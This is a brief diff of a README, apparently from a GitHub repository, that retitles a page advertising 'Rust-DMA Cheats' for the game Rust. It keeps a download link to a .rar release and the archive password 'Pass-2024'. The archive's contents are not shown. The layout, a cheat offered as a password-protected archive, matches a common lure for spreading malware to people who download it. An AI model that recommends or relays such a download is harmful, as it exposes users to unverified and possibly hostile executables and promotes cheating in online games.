@@ -1,4 +1,4 @@
-# Rust-MDMA Cheat
+# Rust-DMA Cheats
 # [Download](https://github.com/b3rking/Rust-MDMA/releases/download/Rust/RustMDMA.rar)
 Pass-2024
 
